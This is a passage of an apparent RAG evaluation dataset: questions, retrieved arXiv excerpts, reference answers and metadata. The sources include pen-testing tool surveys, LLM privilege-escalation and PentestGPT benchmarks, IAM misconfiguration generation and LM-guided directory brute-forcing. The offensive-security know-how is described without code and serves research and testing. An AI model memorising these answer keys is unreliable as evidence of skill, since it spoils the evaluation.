None, 'primary_category': 'cs.CR', 'categories': ['cs.CR', 'cs.AI'], 'links': ['http://arxiv.org/abs/2403.01038v1', 'http://arxiv.org/pdf/2403.01038v1']}]",True
How does Vulsploit use tools and VM benchmarks for pen testing?,"['UDDY: A Scalable Approach for Vulnerable Code Clone Discovery\nVUDDY (2017, Kim et al. [141]) aims to detect defective code in large open-source programs. In particular,\nit is capable to process a billion lines of code in under 15 hours and quickly identify code clones using\nfunction-level granularity and a length-filtering technique. The evaluation included comparison with four\nother code clone detection methods and VUDDY showed better scalability and accuracy. For example, it\nwas possible to find zero-day vulnerabilities popular software like Apache Web Server and Ubuntu Linux OS.\nAppendix C.92. Vulcan: Vulnerability assessment framework for cloud computing\nVulcan (2013, Kamongi et al. [142]) is a tool for vulnerability analysis and remediation in cloud and\nmobile computing. This tool provides software and zero-day vulnerability modelling and assessments. The\ntool is very flexible, presenting the opportunity to add original modules by developers and the integration\nof Vulcan into other vulnerability analysis tools that, for example, focus on web application vulnerabilities\nto expand their assessment to cloud and mobile technology.\nAppendix C.93. VulCNN: An Image-Inspired Scalable Vulnerability Detection System\nVulCNN (2022,(Wu et al. [143]) is designed to address the limitations of existing text-based and graph-\nbased vulnerability detection methods. The tool converts the source code of functions into images that\npreserve program details and then uses these images to detect vulnerabilities through a Convolutional Neural\nNetwork (CNN) model. VulCNN was evaluated on a dataset of 13,687 vulnerable and 26,970 non-vulnerable\nfunctions.\nWith an accuracy of 82% and a True Positive Rate (TPR) of 94%, VulCNN outperformed\neight other state-of-the-art vulnerability detectors, including both commercial tools and deep learning-based\napproaches.\nAppendix C.94. VulDeePecker: A Deep Learning-Based System for Vulnerability Detection\nVulDeePecker (2018, Zhen et al. [144]) employs deep learning for software vulnerability detection, aiming\nto reduce reliance on human-defined features and mitigate false negatives. It uses code gadgets to represent\nand transform programs into vectors suitable for deep learning. The system’s evaluation, using the first\nvulnerability dataset for deep learning, demonstrates significantly fewer false negatives compared to other\nmethods, with reasonable false positives.\nVulDeePecker successfully detects four previously unreported\nvulnerabilities in Xen, Seamonkey, and Libav, unnoticed by other detection systems, highlighting its efficacy\nin uncovering vulnerabilities missed by existing approaches.\nAppendix C.95. An Intelligent and Automated WCMS Vulnerability-Discovery Tool: The Current State of\nthe Web\nVulnet (2019, Cigoj and Blazic [145]) is characterized by its capability to conduct automated, rapid, and\ndynamic vulnerability scans across a wide array of internet websites. Specifically, VulNet focuses on those\nutilising the WordPress Web Content Management Systems (WCMS) and its associated plugins. A crucial\naspect of the tool involves the application of a scoring mechanism tailored to evaluate known vulnerabilities.\nIt’s important to note that VulNet’s vulnerability detection is limited to WordPress web applications and\ntheir associated plugins.\n48\nAppendix C.96. Vulsploit: A Module for Semi-automatic Exploitation of Vulnerabilities\nVulnsloit (2020, Castiglione et al.\n[146]) is a semi-automatic penetration testing tool that collects\nvulnerability data using existing tools like the Nmap Scripting Engine (NSE) and the Vulscan scanner [176].\nThis data is then processed to identify relevant exploits from various repositories, including local and remote\nsources. In preliminary testing on Metasploitable2, Vulnsloit identified 23 open ports and approximately\n220,000 vulnerabilities.\nAppendix C.97. VulPecker: an automated vulnerability detection system based on code similarity analysis\nVulPecker (2016, Li et al. [147]) automatically detects specific vulnerabilities within software source\ncode. Leveraging a set of defined features characterizing patches and utilizing code-similarity algorithms\ntailored for different vulnerability types, VulPecker successfully identifies 40 vulnerabilities not listed in the\nNational Vulnerability Database (NVD). Among these, 18 previously unknown vulnerabilities (anonymized\nfor ethical considerations) are confirmed, while 22 vulnerabilities have been patched silently by vendors in\nlater product releases.\nAppendix C.98. WAPTT-Web application penetration testing tool\nWAPTT (2014, Duric et al. [148]) is designed for web application penetration testing using page similarity\ndetection.\nThe structure of the tool is modular and when compared to tools such', ' system, deploy vulnerabilities\nupdate system, deploy vulnerabilities\nreturn ""running VMs with Vulns""\nsystem output\nreturn database with run data\nText\ndestroy VMs\nStart Priv-Esc for each VM\nFigure 2: Typical benchmark flow including VM creation, provisioning, testing, and tear-down.\nwintermute\nVM\ncmd\ncmd result\ncmd\nLLM-Prompt:\nnext-command\nhistory\ncmd + result\nhistory\nstate\ncmd + result\nnew state\nLLM-Prompt:\nupdate-state\nstate\nstate\nhint\nsingle VM hint\nFigure 3: Relationship between prompts and stored data.\nSelected LLMs. We selected OpenAI’s GPT-3.5-turbo and GPT-4 as\nexamples of cloud-based LLMs. Both are easily available and were\nthe vanguard of the recent LLM-hype. We would have preferred to\ninclude Anthropic’s Claude2 or Google’s Palm2 models but those\nare currently unavailable within the EU.\nWe included two Llama2-70b variants in our evaluation as ex-\namples of locally run LLMs. Both Upstage-Llama2-70b Q5 and Sta-\nbleBeluga2 GGUF are fine-tuned LLama2-70b variants that scored\nhigh on HuggingFace’s Open LLM leaderboard [18] which is based\non comprehension tests.\nWe designated two selection criteria for inclusion in quantitative\nanalysis: first, there must be at least one single successful exploit\nduring a run, and second, at least 90% of the runs must either reach\nthe configured round limit (20 rounds) or end with a successful\nprivilege-escalation. None of the locally run LLMs achieved this,\nthus their results are only used within the qualitative analysis in\nSection 6.\nUnifying Context-Size. We have implemented a context size lim-\niter within our prototype to better allow comparison of different\nmodels. As the context size is directly related to the used token\ncount, and the token count is directly related to the occurring costs,\nreducing the context size would also reduce the cost of using LLMs.\nWe started with a context size of 4096, reduced by a small safety\nmargin of 128 tokens. When testing for larger context sizes, we\nutilize GPT-3.5-turbo-16k with it’s 16k context-size as well as GPT-4\nwith its 8192 context size. While GPT-4 is also documented to have\na 32k context size, this was not available within the EU during\nevaluation.\nWe benchmark each model using the four scenarios described in\nSection 4.2.2 and shown in Figure 3. Additionally, we evaluate the\nimpact of using high-level hints.\n5.1\nFeasibility of LLMs for Priv-Esc\nWe initially analyze the different tested model families and then\nanalyze the different vulnerability classes. The overall results can\nbe seen in Table 2.\nFeasibility of Different Models. GPT-4 is well suited for detecting\nfile-based exploits as it can typically solve 75-100% of test-cases\nof that vulnerability class. GPT-3.5-turbo did fare worse with only\nbeing able to solve 25–50% of those. Round numbers indicate that\ninformation-disclosure based vulnerabilities were found “later” than\nfile-based ones, implying that LLMs tested for them later. Only GPT-\n4 was able to exploit multi-step vulnerabilities like the cron-based\ntest-cases. As mentioned before, none of the locally-run LLMs were\nable to meet the cut-off criteria.\nFeasibility of Vulnerability Classes. Looking from the vulner-\nability class perspective: file-based exploits were well handled,\ninformation-disclosure based exploits needed directing LLMs to that\narea, and multi-step cron attacks are hard for LLMs. One surprise\nwas that only GPT-4 was only once able to detect the root-password\nstored in vacation.txt placed in the user’s home directory.\nLLMs as Hackers: Autonomous Linux Privilege Escalation Attacks\nTable 2: Hacking Benchmark Results of LLMs.\nModel\nCtx. Size\nHints\nHistory\nState\nsuid-gtfo\nsudo-all\nsudo-gtfo\ndocker\npassword reuse\nweak password\npassword in file\nbash_history\nSSH key\ncron\ncron-wildcard\ncron/visible\ncron-wildcard/visible\n% solved\nupstart-llama2\n4096\n-\n-\n-\n-\n✓14\n-']","Vulsploit is a semi-automatic penetration testing tool that collects vulnerability data using existing tools like the Nmap Scripting Engine (NSE) and the Vulscan scanner. This data is then processed to identify relevant exploits from various repositories, including local and remote sources. In preliminary testing on Metasploitable2, Vulsploit identified 23 open ports and approximately 220,000 vulnerabilities.",multi_context,"[{'Published': '2024-07-19', 'Title': 'Bridging the Gap: A Survey and Classification of Research-Informed Ethical Hacking Tools', 'Authors': 'Paolo Modesti, Lewis Golightly, Louis Holmes, Chidimma Opara, Marco Moscini', 'Summary': ""The majority of Ethical Hacking (EH) tools utilised in penetration testing\nare developed by practitioners within the industry or underground communities.\nSimilarly, academic researchers have also contributed to developing security\ntools. However, there appears to be limited awareness among practitioners of\nacademic contributions in this domain, creating a significant gap between\nindustry and academia's contributions to EH tools. This research paper aims to\nsurvey the current state of EH academic research, primarily focusing on\nresearch-informed security tools. We categorise these tools into process-based\nframeworks (such as PTES and Mitre ATT\\&CK) and knowledge-based frameworks\n(such as CyBOK and ACM CCS). This classification provides a comprehensive\noverview of novel, research-informed tools, considering their functionality and\napplication areas. The analysis covers licensing, release dates, source code\navailability, development activity, and peer review status, providing valuable\ninsights into the current state of research in this field."", 'entry_id': 'http://arxiv.org/abs/2407.14255v1', 'published_first_time': '2024-07-19', 'comment': 'This is the extended version of the paper published in the Journal of\n  Cybersecurity and Privacy, 4, no. 3: pp 410-448, 2024', 'journal_ref': 'Volume 4, Issue 3: pp 410-448, 2024', 'doi': '10.3390/jcp4030021', 'primary_category': 'cs.CR', 'categories': ['cs.CR'], 'links': ['http://dx.doi.org/10.3390/jcp4030021', 'http://arxiv.org/abs/2407.14255v1', 'http://arxiv.org/pdf/2407.14255v1']}, {'Published': '2024-03-19', 'Title': 'LLMs as Hackers: Autonomous Linux Privilege Escalation Attacks', 'Authors': 'Andreas Happe, Aaron Kaplan, Jürgen Cito', 'Summary': 'Penetration testing, an essential component of software security testing,\nallows organizations to proactively identify and remediate vulnerabilities in\ntheir systems, thus bolstering their defense mechanisms against potential\ncyberattacks. One recent advancement in the realm of penetration testing is the\nutilization of Language Models (LLMs).\n  We explore the intersection of LLMs and penetration testing to gain insight\ninto their capabilities and challenges in the context of privilege escalation.\nWe create an automated Linux privilege-escalation benchmark utilizing local\nvirtual machines. We introduce an LLM-guided privilege-escalation tool designed\nfor evaluating different LLMs and prompt strategies against our benchmark.\n  Our results show that GPT-4 is well suited for detecting file-based exploits\nas it can typically solve 75-100\\% of test-cases of that vulnerability class.\nGPT-3.5-turbo was only able to solve 25-50% of those, while local models, such\nas Llama2 were not able to detect any exploits. We analyze the impact of\ndifferent prompt designs, the benefits of in-context learning, and the\nadvantages of offering high-level guidance to LLMs. We discuss challenging\nareas for LLMs, including maintaining focus during testing, coping with errors,\nand finally comparing them with both stochastic parrots as well as with human\nhackers.', 'entry_id': 'http://arxiv.org/abs/2310.11409v3', 'published_first_time': '2023-10-17', 'comment': '11 pages', 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR', 'cs.AI'], 'links': ['http://arxiv.org/abs/2310.11409v3', 'http://arxiv.org/pdf/2310.11409v3']}]",True
What is the process for generating a Type-II permission for assigning a Type-I/target permission to an entity according to IAMVulGen?,"['\nmission; for each entity with one of these types and each Type-I/target permission, IAMVulGen\ngenerates a Type-II permission for assigning the Type-I/target permission to the entity. For\nthe target permission, based on AWS IAM security best practice documentation [6] and studies\n[20, 28, 30, 60], permissions which attackers usually target to obtain (e.g., the permission to access\na sensitive S3 bucket) are manually identified. With the generated permission space, IAMVulGen\ncreates the permission assignment component A, by assigning each entity with 𝛾𝑝(𝛾𝑝= 20% by\ndefault) of the permissions uniformly sampled from the permission space.\n• For the flow state function W, IAMVulGen sets the state of each permission flow to true with\nthe probability of 𝛾𝑤(𝛾𝑤= 0.2 by default) and to false with the probability of 1 −𝛾𝑤. With the\n16\nYang Hu, Wenxi Wang, Sarfraz Khurshid, and Mohit Tiwari\nTask Set\nSource\n# Task\n# Untrusted\n# Visible Entity\n# Visible Perm Flow\n# Permission\nEntity Type\nmin\nmax\navg\nmin\nmax\navg\nmin\nmax\navg\nPretrain\nIAMVulGen\n2,000\n51\n2\n34\n15\n2\n274\n48\n6\n313\n67\nTest-A\nIAMVulGen\n500\n51\n3\n27\n14\n2\n300\n70\n12\n322\n72\nTest-B\nIAM Vulnerable\n31\n2\n1\n3\n2\n0\n6\n2\n3\n12\n7\nTest-C\nSecurity Startup\n2\n2\n15\n25\n20\n84\n261\n172\n88\n252\n170\nTable 1. Statistics of three PE task sets.\ngenerated PFG, the fixed point iteration is performed to produce a concrete IAM configuration\n(as introduced in Section 3.1.3).\nWith the generated IAM configuration, an entity and a permission are uniformly selected\nfrom the configuration’s entity and permission spaces to be the untrusted entity and the target\npermission, respectively. Next, IAMVulGen utilizes four precise whitebox PE detectors to check if\nthere exists a PE in the generated concrete IAM configuration. If at least one detector reports a PE,\nthe concrete misconfiguration is thus generated; otherwise, the process iterates by generating a\nnew configuration. The applied four whitebox PE detectors include three state-of-the-art IAM PE\ndetectors, namely Pacu [33], Cloudsplaining [47] and PMapper [21], and a whitebox variant of\nTAC which only applies the concrete IAM modeling to detect PEs, namely TAC-WB.\n6.2\nInitial Abstract Misconfiguration Generation\nAs introduced in Section 3.2.1, the initial abstract IAM configuration is generated with the pre-\ndefined visible entities. Based on the created concrete misconfiguration, IAMVulGen creates the\ncorresponding initial abstract IAM misconfiguration by uniformly sampling𝛾𝑣(𝛾𝑣= 20% by default)\nof entities in the concrete IAM misconfiguration as the visible entities.\n7\nEVALUATION\n7.1\nExperimental Setup\n7.1.1\nPretraining and Testing Task Sets. To pretrain TAC, we create an IAM PE task set called\nPretrain, containing 2,000 tasks randomly generated by our task generator IAMVulGen under its\ndefault setting. To evaluate TAC, we create three testing task sets: 1) Test-A set consisting of 500\nnew tasks randomly generated by IAMVulGen under its default setting, and 2) Test-B set consisting\nof 31 tasks collected from public IAM PE benchmark set called IAM Vulnerable [1], and Test-C set\nconsisting of two real-world misconfigurations with PEs collected from a US-based cloud security\nstartup. Note that none of the three testing task sets overlap with the Pretrain set.\nTable 1 shows the statistics of the generated task sets. The Pretrain task set includes diverse PE\ntasks with 51 untrusted entity types, having 2–34 visible entities, 2–274 visible permission flows,\nand 6–313 permissions. The Test-A task set has similar statistics. In contrast, Task-B set includes\nmuch smaller and less diverse tasks with only 2 untrusted entity types, 1–3 visible entities']","For each entity with one of the specified types and each Type-I/target permission, IAMVulGen generates a Type-II permission for assigning the Type-I/target permission to the entity. Permissions that attackers usually target to obtain are manually identified based on AWS IAM security best practice documentation and various studies. IAMVulGen then creates the permission assignment component by assigning each entity with 20% of the permissions uniformly sampled from the permission space.",simple,"[{'Published': '2024-06-08', 'Title': 'Interactive Greybox Penetration Testing for Cloud Access Control using IAM Modeling and Deep Reinforcement Learning', 'Authors': 'Yang Hu, Wenxi Wang, Sarfraz Khurshid, Mohit Tiwari', 'Summary': 'Identity and Access Management (IAM) is an access control service in cloud\nplatforms. To securely manage cloud resources, customers need to configure IAM\nto specify the access control rules for their cloud organizations. However,\nincorrectly configured IAM can be exploited to cause a security attack such as\nprivilege escalation (PE), leading to severe economic loss. To detect such PEs\ndue to IAM misconfigurations, third-party cloud security services are commonly\nused. The state-of-the-art services apply whitebox penetration testing\ntechniques, which require access to complete IAM configurations. However, the\nconfigurations can contain sensitive information. To prevent the disclosure of\nsuch information, customers need to manually anonymize the configuration.\n  In this paper, we propose a precise greybox penetration testing approach\ncalled TAC for third-party services to detect IAM PEs. To mitigate the dual\nchallenges of labor-intensive anonymization and potentially sensitive\ninformation disclosures, TAC interacts with customers by selectively querying\nonly the essential information needed. Our key insight is that only a small\nfraction of information in the IAM configuration is relevant to the IAM PE\ndetection. We first propose IAM modeling, enabling TAC to detect a broad class\nof IAM PEs based on the partial information collected from queries. To improve\nthe efficiency and applicability of TAC, we aim to minimize interactions with\ncustomers by applying Reinforcement Learning (RL) with Graph Neural Networks\n(GNNs), allowing TAC to learn to make as few queries as possible. Experimental\nresults on both synthetic and real-world tasks show that, compared to\nstate-of-the-art whitebox approaches, TAC detects IAM PEs with competitively\nlow false negative rates, employing a limited number of queries.', 'entry_id': 'http://arxiv.org/abs/2304.14540v5', 'published_first_time': '2023-04-27', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR', 'cs.SE'], 'links': ['http://arxiv.org/abs/2304.14540v5', 'http://arxiv.org/pdf/2304.14540v5']}]",True
How does tree reconstruction help in understanding the filesystem of a web application during a directory brute-force attack?,"[' a set of directories utilized\nin a brute-force attack. Therefore, they play a vital choice when\nusing these tools. A proper choice of wordlist can greatly impact\nthe results, potentially uncovering more vulnerabilities.\nIn the context of directory brute-forcing attacks, there is a range\nof wordlist categories that fit different needs: from general-purpose\nwordlists to backup-file wordlists, CMS-specific (Content manage-\nment system) wordlists, and even more.\nVarious automated tools are provided by default with various\nwordlists. However, many other user-created wordlists can be found\non the Internet, and users may also create ad-hoc wordlists that\nsatisfy their needs. In the scope of this research, we selected four\ngeneral-purpose wordlists to assess:\n• big_wfuzz [BW]2: a Wfuzz default general-purpose wordlist\nthat contains 3024 words.\n• top_10k_github [GH]3: a user-created wordlist in GitHub\ncontaining 10000 words, created selecting the most common\nwords found in ten million URLs.\n• megabeast_wfuzz [MW]4: another Wfuzz default general-\npurpose wordlist that contains 45459 words.\n• directory-list_dirbuster [DB]5: a Dirbuster default wordlist\ncontaining 141835 words.\n4\nMETHODOLOGY\nOverview. Traditional attacks are essentially inefficient, as they\nare based on brute-forcing mechanisms. In this work, we explore\ntwo different approaches that might improve the attack: one based\non probabilities and one using a Language Model for path gener-\nation. Given the scope of this research, which aims to be general\nand not to focus on specific technologies or sensitive information,\nboth approaches aim to highlight the feasibility of implementing\nmore efficient attacks and aim to exploit two features not used by\nthe traditional wordlist-based brute-forcing approach:\n• Prior Knowledge. Web applications that belong to similar\ncategories might have a similar structure. Given a target\nwebsite, using knowledge retrieved from similar websites\nto decide what HTTP requests to send to the target website\nmay positively impact the results.\n• Adaptive decision-making. During a directory brute-force\nattack, having the ability to dynamically decide which URLs\nto generate and which requests to send might improve the hit\nrate of successful responses and reduce ineffective requests.\nTree reconstruction. Before we discuss how traditional tools and\nour proposed approaches work, it is helpful to understand how\nHTTP requests allow us to reconstruct the filesystem of a web\napplication. Since a filesystem has a hierarchical tree structure,\nthe paths of each web application can be used to reconstruct it. In\nparticular, we used the AnyTree class in Python to reconstruct the\nfilesystems of each web application, considering as root the starting\n2https://github.com/xmendez/wfuzz/blob/master/wordlist/general/big.txt\n3https://github.com/xajkep/wordlists/blob/master/discovery/top-10k-web-\ndirectories_from_10M_urlteam_links.txt\n4https://github.com/xmendez/wfuzz/blob/master/wordlist/general/megabeast.txt\n5https://github.com/3ndG4me/KaliLists/blob/master/dirbuster/directory-list-1.0.txt\nURL usually referred to as the target. This strategy allows us to\nperform depth-level analysis and simulations of offline brute-force\nattacks so that we do not perform actual attacks on online web\napplications, thus maintaining an ethical posture that still allows\nus to obtain meaningful results.\nFor example, considering the paths ""/news"", ""/home"", ""/register"",\n""/news/2024"", ""/news/today"" and ""/news/weather"" as the paths\nextracted from the crawl of a web application, we can visualize the\ncorresponding reconstructed tree in Figure 1.\n/\nnews\nhome \nregister\n2024\ntoday\nweather\nFigure 1: Visualization of a reconstructed tree.\n4.1\nStandard approach\nThe standard wordlist-based approach that we will use to compare\nthe results with our proposed approaches is based on two main\nstrategies: Depth-First and Breadth-First.\nDepth-First. In a directory brute-force attack, the Depth-First\napproach prioritizes the exploration of subdirectories within a dis-\ncovered directory before moving on to other directories at the same\nlevel. The algorithm initiates by sequentially sending HTTP re-\nquests using the entries in a wordlist. Upon receiving a positive\nresponse, which indicates the']","Tree reconstruction helps in understanding the filesystem of a web application during a directory brute-force attack by using the paths of each web application to reconstruct its hierarchical tree structure. This allows for depth-level analysis and simulations of offline brute-force attacks, enabling researchers to obtain meaningful results without performing actual attacks on online web applications.",simple,"[{'Published': '2024-04-22', 'Title': 'Offensive AI: Enhancing Directory Brute-forcing Attack with the Use of Language Models', 'Authors': 'Alberto Castagnaro, Mauro Conti, Luca Pajola', 'Summary': 'Web Vulnerability Assessment and Penetration Testing (Web VAPT) is a\ncomprehensive cybersecurity process that uncovers a range of vulnerabilities\nwhich, if exploited, could compromise the integrity of web applications. In a\nVAPT, it is common to perform a \\textit{Directory brute-forcing Attack}, aiming\nat the identification of accessible directories of a target website. Current\ncommercial solutions are inefficient as they are based on brute-forcing\nstrategies that use wordlists, resulting in enormous quantities of trials for a\nsmall amount of success. Offensive AI is a recent paradigm that integrates\nAI-based technologies in cyber attacks. In this work, we explore whether AI can\nenhance the directory enumeration process and propose a novel Language\nModel-based framework. Our experiments -- conducted in a testbed consisting of\n1 million URLs from different web application domains (universities, hospitals,\ngovernment, companies) -- demonstrate the superiority of the LM-based attack,\nwith an average performance increase of 969%.', 'entry_id': 'http://arxiv.org/abs/2404.14138v1', 'published_first_time': '2024-04-22', 'comment': 'Under submission', 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR'], 'links': ['http://arxiv.org/abs/2404.14138v1', 'http://arxiv.org/pdf/2404.14138v1']}]",True
How does pre-decision making boost the security margin estimator's training?,"[' enhances the security margin\nestimator’s training process by swiftly identifying critical oper-\nating points within complex power systems. This enhancement\nsignificantly boosts the security margin estimator’s training\nefficiency. Moreover, its high practical value is underscored\nby its applicability to large-scale power systems for effectively\ncapturing critical operating conditions.\nThe remainder of the paper is structured as follows. Section\nII briefly introduces the basic knowledge of pre-decision\nmaking, SRL algorithm, and AL. Section III elaborates the\nproposed framework, including the AL-based security margin\nestimator and the gradient projection-based short-term voltage\nstability emergency control pre-decision making module. The\nNew England 39-bus system and the Guangdong Provincal\nPower Grid (GPG) are utilized to test the performance of our\nframework in Section IV. Section V concludes the paper.\nII. PRELIMINARIES\nA. Safe Reinforcement Learning (SRL)\nReinforcement learning involves continuous interaction with\nthe environment to ascertain the most effective strategy via\ntrial and error. However, in some practical applications, includ-\ning autonomous driving and power system operations, faulty\npolicies can result in substantial economic repercussions or\ncompromise safety [13]. Hence, the imperative to integrate\nsafety considerations during the training or operational phases\nin such contexts has precipitated the emergence of SRL algo-\nrithms. Depending on the form of constraints, safe reinforce-\nment learning can be categorized into two types: process-wise\nsafe reinforcement learning and state-wise safe reinforcement\nlearning. Initial endeavors of process-wise safe reinforcement\nlearning were grounded on the constrained Markov decision\nprocesses (CMDP) framework, wherein constraints are articu-\nlated as either cumulative or episodic. However, real-world\nscenarios often involve transient and deterministic critical\nconstraints, which, if violated, can lead to catastrophic task\nfailure [21]. Therefore, it is necessary to introduce more\nrobust constraints in reinforcement learning. Unlike process-\nwise safe reinforcement learning, state-wise SRL is based on\nthe SCMDP, where the safety specification is to satisfy a\nhard cost constraint at every step persistently. Similarly, the\ncost functions are denoted with C1, C2, ..., and the feasible\nstationary policy set ¯\nΠC for SCMDP is defined as:\n¯\nΠC = {π ∈Π|∀(st, at, st+1) ∼τ,\n∀i, Ci(st, at, st+1) ≤ωi}\n(1)\nwhere τ ∼π, ωi ∈R, and π is the agent’s policy. Compared\nto process-wise SRL, state-wise SRL has stronger constraint\neffects and is more suitable for scenarios with stricter state\nsecurity demand.\nThe purpose of state-wise SRL is to find a policy that max-\nimizes the cumulative gain G = P∞\nt=0 γtrt while satisfying\nthe security constraints, which is mathematically expressed as\nmax\nθ\nG(πθ),\ns.t. πθ ∈¯\nΠC\n(2)\n3\nwhere rt denotes the reward at t, γ denotes the discount factor,\nand πθ is the agent’s parameterized policy.\nB. Pre-decision making and its SCMDP Modeling\nPre-decision making plays a crucial role in preventing\nfault propagation and safeguarding power system security and\nstability. In this approach, emergency control strategies are\npre-generated based on the system’s operating state and a\npredefined set of potential faults. When a fault occurs, the\nstability control apparatus consults these pre-established rules\naccording to the fault type and the existing operating condition\nand then executes the necessary emergency control actions\naccording to pre-determined criteria. Emergency control mea-\nsures in power systems, such as load shedding, generator\ntripping, and modulating DC transmission line power, are es-\nsential for preventing system collapse and enhancing stability.\nIn this context, we focus on load shedding as a representative\nexample. Our proposed pre-decision making scheme aims to\naddress short-term voltage instability, minimizing the impact\nof faults while keeping costs as low as possible. Specifically,\nwe seek to reduce the amount of load shedding required to\nstabilize the system’s voltage after a fault. The mathematical\nformulation of the power system’s short-term voltage stability\ncontrol pre-decision making process is delineated as follows:\narg min\nat∈A']","Pre-decision making boosts the security margin estimator's training by swiftly identifying critical operating points within complex power systems, significantly enhancing the training efficiency.",reasoning,"[{'Published': '2024-05-26', 'Title': 'Make Safe Decisions in Power System: Safe Reinforcement Learning Based Pre-decision Making for Voltage Stability Emergency Control', 'Authors': 'Congbo Bi, Lipeng Zhu, Di Liu, Chao Lu', 'Summary': ""The high penetration of renewable energy and power electronic equipment bring\nsignificant challenges to the efficient construction of adaptive emergency\ncontrol strategies against various presumed contingencies in today's power\nsystems. Traditional model-based emergency control methods have difficulty in\nadapt well to various complicated operating conditions in practice. Fr emerging\nartificial intelligence-based approaches, i.e., reinforcement learning-enabled\nsolutions, they are yet to provide solid safety assurances under strict\nconstraints in practical power systems. To address these research gaps, this\npaper develops a safe reinforcement learning (SRL)-based pre-decision making\nframework against short-term voltage collapse. Our proposed framework employs\nneural networks for pre-decision formulation, security margin estimation, and\ncorrective action implementation, without reliance on precise system\nparameters. Leveraging the gradient projection, we propose a security\nprojecting correction algorithm that offers theoretical security assurances to\namend risky actions. The applicability of the algorithm is further enhanced\nthrough the incorporation of active learning, which expedites the training\nprocess and improves security estimation accuracy. Extensive numerical tests on\nthe New England 39-bus system and the realistic Guangdong Provincal Power Grid\ndemonstrate the effectiveness of the proposed framework."", 'entry_id': 'http://arxiv.org/abs/2405.16485v1', 'published_first_time': '2024-05-26', 'comment': '11 pages', 'journal_ref': None, 'doi': None, 'primary_category': 'eess.SY', 'categories': ['eess.SY', 'cs.SY'], 'links': ['http://arxiv.org/abs/2405.16485v1', 'http://arxiv.org/pdf/2405.16485v1']}]",True
How did GPT-3.5 perform in end-to-end penetration testing tasks compared to other LLMs?,"[' to assess the performances of various LLMs in\npenetration testing tasks using the strategy mentioned above.\nModel Selection. Our study focuses on three cutting-edge\nLLMs that are currently accessible: GPT-3.5 with 8k to-\nken limit, GPT-4 with 32k token limit from OpenAI, and\nLaMDA [33] from Google. These models are selected based\non their prominence in the research community and consis-\ntent availability. To interact with the LLMs mentioned above,\nwe utilize chatbot services provided by OpenAI and Google,\nnamely ChatGPT [34] and Bard [18]. For this paper, the terms\nGPT-3.5, GPT-4, and Bard will represent these three LLMs.\nExperimental Setup. Our experiments occur in a local setting\nwith both target and testing machines on the same private\nnetwork. The testing machine runs on Kali Linux [35], version\n2023.1.\n3We selected Offensive Security Certified Professionals (OSCP) testers.\nTool Usage. Our study aims to assess the innate capabilities\nof LLMs on penetration testing, without reliance on end-to-\nend automated vulnerability scanners such as Nexus [36]\nand OpenVAS [37]. Consequently, we explicitly instruct the\nLLMs to refrain from using these tools. We follow the LLMs’\nrecommendations for utilizing other tools designed to validate\nspecific vulnerability types (e.g., sqlmap [38] for SQL injec-\ntions). Occasionally, versioning discrepancies may lead the\nLLMs to provide incorrect instructions for tool usage. In such\ninstances, our penetration testing experts evaluate whether the\ninstructions would have been valid for a previous version of\nthe tool. They then make any necessary adjustments to ensure\nthe tool’s correct operation.\n4.3\nCapability Evaluation (RQ1)\nTo address RQ1, we evaluate the performance of three lead-\ning LLMs: GPT-4, Bard, and GPT-3.5. We summarize these\nfindings in Table 1. Each LLM successfully completes at least\none end-to-end penetration test, highlighting their versatility\nin simpler environments. Of these, GPT-4 excels, achieving\nsuccess on 4 easy and 1 medium difficulty targets. Bard and\nGPT-3.5 follow with success on 2 and 1 easy targets, respec-\ntively. In sub-tasks, GPT-4 completes 55 out of 77 on easy\ntargets and 30 out of 71 on medium. Bard and GPT-3.5 also\nshow potential, finishing 16 (22.54%) and 13 (18.31%) of\nmedium difficulty sub-tasks, respectively. However, on hard\ntargets, all models’ performance declines. Though they can\ninitiate the reconnaissance phase, they struggle to exploit iden-\ntified vulnerabilities. This is anticipated since hard targets\nare designed to be especially challenging. They often fea-\nture seemingly vulnerable services that are non-exploitable,\nknown as rabbit holes [39]. The pathways to exploit these\nmachines are unique and unpredictable, resisting automated\ntool replication. For example, the target Falafel has special-\nized SQL injection vulnerabilities resistant to sqlmap. Current\nLLMs cannot tackle these without human expert input.\nFinding 1: Large Language Models (LLMs) have shown\nproficiency in conducting end-to-end penetration testing\ntasks but struggle to overcome challenges presented by\nmore difficult targets.\nWe further examine the detailed sub-task completion per-\nformances of the three LLMs compared to the walkthrough\n(WT), as presented in Table 2. Analyzing the completion sta-\ntus, we identify several areas where LLMs excel. First, they\nadeptly utilize common penetration testing tools to interpret\nthe corresponding outputs, especially in enumeration tasks\ncorrectly. For example, all three evaluated LLMs successfully\nperform nine Port Scanning sub-tasks. They can configure\nthe widely-used port scanning tool, nmap [40], comprehend\nthe scan results, and formulate subsequent actions. Second,\nthe LLMs reveal a deep understanding of prevalent vulner-\n6\nTable 1: Overall performance of LLMs on Penetration Testing Benchmark.\nEasy\nMedium\nHard\nAverage\nTools\nOverall (7)\nSub-task (77)\nOverall (4)\nSub-task (71)\nOverall (2)\nSub-task (34)\nOverall (13)\nSub-task (182)\nGPT-3.5\n1 (14.29%)\n24 (31.17%)\n0 (0.00%)\n13 (18.31%)\n0 (0']","GPT-3.5 successfully completed 1 end-to-end penetration test on easy targets, while GPT-4 excelled with success on 4 easy and 1 medium difficulty targets. Bard followed with success on 2 easy targets. On sub-tasks, GPT-3.5 completed 24 out of 77 on easy targets and 13 out of 71 on medium targets. However, all models, including GPT-3.5, struggled with hard targets.",simple,"[{'Published': '2024-06-02', 'Title': 'PentestGPT: An LLM-empowered Automatic Penetration Testing Tool', 'Authors': 'Gelei Deng, Yi Liu, Víctor Mayoral-Vilches, Peng Liu, Yuekang Li, Yuan Xu, Tianwei Zhang, Yang Liu, Martin Pinzger, Stefan Rass', 'Summary': 'Penetration testing, a crucial industrial practice for ensuring system\nsecurity, has traditionally resisted automation due to the extensive expertise\nrequired by human professionals. Large Language Models (LLMs) have shown\nsignificant advancements in various domains, and their emergent abilities\nsuggest their potential to revolutionize industries. In this research, we\nevaluate the performance of LLMs on real-world penetration testing tasks using\na robust benchmark created from test machines with platforms. Our findings\nreveal that while LLMs demonstrate proficiency in specific sub-tasks within the\npenetration testing process, such as using testing tools, interpreting outputs,\nand proposing subsequent actions, they also encounter difficulties maintaining\nan integrated understanding of the overall testing scenario.\n  In response to these insights, we introduce PentestGPT, an LLM-empowered\nautomatic penetration testing tool that leverages the abundant domain knowledge\ninherent 